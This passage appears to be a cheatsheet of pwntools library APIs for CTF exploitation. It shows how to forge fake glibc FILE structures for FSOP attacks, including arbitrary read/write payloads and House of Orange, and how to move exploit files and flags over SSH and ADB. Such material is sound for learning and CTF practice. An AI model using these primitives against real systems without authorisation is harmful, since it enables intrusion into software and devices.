#   libc = ELF(path)
#
# ==============================================================================
# pwnlib.filepointer — forge FILE structs (FSOP) for _IO_FILE exploits
# https://docs.pwntools.com/en/stable/filepointer.html
# ==============================================================================
#
# FileStructure builds a fake _IO_FILE (glibc) you can serialize with bytes().
# Set arch first; field offsets follow context.arch. 'null' = addr of a NULL qword.
#
#   from pwn import *
#   context.arch = 'amd64'
#   fp = FileStructure(null=0x0)
#   fp.flags        = 0xfbad1800          # _IO_MAGIC | flags
#   fp._IO_read_ptr = 0x0
#   fp._IO_buf_base = 0x601000
#   fp._IO_buf_end  = 0x601000 + 0x100
#   fp.fileno       = 1
#   fp.vtable       = 0x7ffff7dd0000      # fake/overwritten vtable
#   payload = bytes(fp)                   # serialize; len(fp) == struct size (224 amd64)
#
# Convenience payloads: turn the FILE into an arbitrary read/write primitive.
#
#   from pwn import *
#   context.arch = 'amd64'
#   fp = FileStructure(null=0x0)
#   leak_payload  = fp.write(addr=0x601050, size=0x30)  # fwrite -> leak memory out
#   write_payload = fp.read(addr=0x601050, size=0x30)   # fread  -> write into memory
#   orange        = fp.orange(io_list_all=0x7ffff7dd7520, vtable=0x601000)  # House of Orange
#   partial       = fp.struntil('_IO_buf_end')          # only bytes up to a field
#
# ==============================================================================
# pwnlib.filesystem — pathlib-style local & remote (SSH) file access
# https://docs.pwntools.com/en/stable/filesystem.html
# ==============================================================================
#
# Path is a pathlib.Path that can make syscalls; read/write text or bytes easily.
#
#   from pwn import *
#   from pwnlib.filesystem import Path
#   p = Path('/tmp/payload.bin')
#   p.write_bytes(b'\xde\xad\xbe\xef')     # write raw bytes
#   data = p.read_bytes()                  # -> b'\xde\xad\xbe\xef'
#   Path('/tmp/note.txt').write_text('hi')
#   print(p.exists(), p.is_file())
#
# Remote files over SSH: get path objects from the ssh session; same API.
# The ssh tube also offers direct download()/upload() helpers.
#
#   from pwn import *
#   s = ssh('user', 'host', password='pw')
#   rp = s.path('/home/user/flag')          # SSHPath bound to this session
#   secret = rp.read_bytes()                # read remote file
#   s.path('/tmp/exp').write_bytes(b'...')  # write remote file
#   s.download('/home/user/flag', './flag') # pull file to local
#   s.upload('./exploit', '/tmp/exploit')   # push file to remote
#
# ==============================================================================
# pwnlib.flag — submit CTF flags to a scoring server
# https://docs.pwntools.com/en/stable/flag.html
# ==============================================================================
#
# submit_flag() sends a captured flag to a submission server; most fields
# default from the environment. Handy for automated/repeated exploitation.
#
#   from pwn import *
#   from pwnlib.flag import submit_flag
#   submit_flag('FLAG{pwned}', server='submit.ctf.example', port=31337,
#               exploit='heap-oob', target='pwn-3', team='myteam')
#
# ==============================================================================
# pwnlib.qemu — run/debug foreign-arch binaries via qemu-user
# https://docs.pwntools.com/en/stable/qemu.html
# ==============================================================================
#
# Set context.arch and process() transparently runs the binary under
# qemu-<arch>-static. Great for ARM/MIPS/etc. challenges on an x86 box.
#
#   from pwn import *
#   context.arch = 'arm'
#   io = process('./arm_binary')          # auto-wrapped with qemu-arm-static
#   io.sendline(b'input')
#   print(io.recvall())
#
# Query helper paths / linker prefix for the emulated arch.
#
#   from pwn import *
#   import pwnlib.qemu
#   pwnlib.qemu.user_path(arch='aarch64')     # e.g. 'qemu-aarch64-static'
#   pwnlib.qemu.ld_prefix(arch='arm')         # sysroot for libc, e.g. /etc/qemu-binfmt/arm
#   # export QEMU_LD_PREFIX=/path/to/sysroot   # override libc search path
#
# Debug a cross-arch binary: gdb.debug() wires up qemu's gdbstub + arch/sysroot.
#
#   from pwn import *
#   context.arch = 'aarch64'
#   io = gdb.debug('./aarch64_binary', gdbscript='b main\nc')  # qemu -g under the hood
#   io.interactive()
#
# ==============================================================================
# pwnlib.adb — talk to Android devices over ADB
# https://docs.pwntools.com/en/stable/adb.html
# ==============================================================================
#
# List/select devices, then run shell commands and move files. Set context.device
# to target a specific serial when several are attached.
#
#   from pwn import *
#   for d in adb.devices():          # enumerate attached devices
#       print(d.serial)
#   adb.wait_for_device()            # block until a device is ready
#   context.device = 'ZX1G22LH8S'    # select by serial (or an adb.Device instance)
#
# Run commands, push/pull files, install APKs.
#
#   from pwn import *
#   ver = adb.process(['cat', '/proc/version']).recvall()   # run a command, get output
#   io  = adb.shell('id')                                    # tube for an on-device shell
#   remote_path = adb.push('./exploit', '/data/local/tmp')   # upload -> returns dest path
#   adb.pull('/data/local/tmp/flag', './flag')               # download to local
#   adb.install('app.apk')                                   # install an APK
#
# ##############################################################################
# END OF CHEATSHEET
# ##############################################################################
